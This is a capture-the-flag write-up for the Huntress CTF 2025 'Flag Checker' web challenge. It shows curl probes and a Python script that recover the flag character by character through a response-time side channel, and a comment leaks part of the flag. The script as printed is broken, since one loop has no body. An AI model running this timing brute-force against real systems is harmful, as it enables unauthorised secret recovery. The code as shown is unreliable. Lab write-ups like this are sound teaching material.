---

layout: post
title: "Huntress CTF 2025 - Flag Checker"
categories: writeup web 
permalink: :categories/:title

---

## Challenge Description

>We've decided to make this challenge really straight forward. All you have to do is find out the flag!
>

>Juuuust make sure not to trip any of the security controls implemented to stop brute force attacks...

---
## Thought process

After sending request and looking and responses and also knowing the flag format:

I tested multiple scenarios and noticed one thing that is maybe a teller:

```bash
curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=f
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:53:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.101613

curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=a
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:53:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.001067

curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=b
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:54:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.001057

```


Notice anything that stands out. Lets try with this one, remember we know flag format is `flag\{[0-9a-f]{32}\}`
So basically 32 characters of hex numbers between the {}

Now look at these two requests:
```bash
curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=flag
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:56:39 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.401796

curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=test
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:56:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.000985
```

Yeah that is right whenever we input one more character that is correct the X-Response-Time goes up. So what did I do wrote really bad script that tested all 0-9a-f and inputed that and then again. Here is the script but it could be written much much better:

## Solution(Python)

```python
import requests
import time
from datetime import datetime

def get_response_info(url):
    """Get response information in the specified format"""
    try:
        response = requests.get(url, timeout=10)

        info = {
            'URL': url,
            'Timestamp': datetime.now().isoformat(),
            'Status Code': response.status_code,
            'Reason': response.reason,
            'Response Time': f"{response.elapsed.total_seconds():.6f} seconds",
            'Content Type': response.headers.get('content-type', 'N/A'),
            'Content Length': len(response.content),
            'Headers': dict(response.headers)
        }

        return info
    except Exception as e:
        return {'error': str(e)}

def print_info(info):
    """Print information in the specified format"""
    if 'error' in info:
        print(f"Error: {info['error']}")
        return

    print('-' * 50)
    print(f"URL: {info['URL']}")
    print(f"Timestamp: {info['Timestamp']}")
    print(f"Status Code: {info['Status Code']}")
    print(f"Reason: {info['Reason']}")
    print(f"Response Time: {info['Response Time']}")
    print(f"Content Type: {info['Content Type']}")
    print(f"Content Length: {info['Content Length']} bytes")
    print("\nHeaders:")
    for header, value in info['Headers'].items():
def main():
    base_url = "http://10.1.221.57/submit"
    #prefix ="77ba0346d9565e77344b9fe40ecf1369"
    prefix=""
    hex_letters = ['a', 'b', 'c', 'd', '}', 'e', 'f', "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]

    for char in hex_letters:
        url = f"{base_url}?flag=flag{{{prefix}{char}"
        print(f"Requesting: {url}")
        info = get_response_info(url)
        print_info(info)

        # Wait 20 seconds before next request (except after the last one)
        if char != hex_letters[-1]:
            print("Waiting 20 seconds before next request...")
            #time.sleep(20)

if __name__ == "__main__":
    main()
    
```

So basically you send requests and when one of them has greater X-Response-Time you put that character in prefix and start again 